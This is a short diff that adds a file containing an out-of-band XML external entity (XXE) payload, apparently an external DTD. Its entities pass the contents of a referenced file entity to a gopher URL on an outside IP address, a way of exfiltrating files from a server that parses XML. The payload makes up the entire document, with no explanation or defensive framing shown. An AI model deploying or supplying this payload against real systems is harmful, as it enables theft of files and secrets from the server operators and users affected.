@@ -1,0 +1,4 @@
+<!ENTITY % all 
+"<!ENTITY &#x25; send SYSTEM 'gopher://91.121.157.120/xxe.php?%file;'>">
+%all;
+
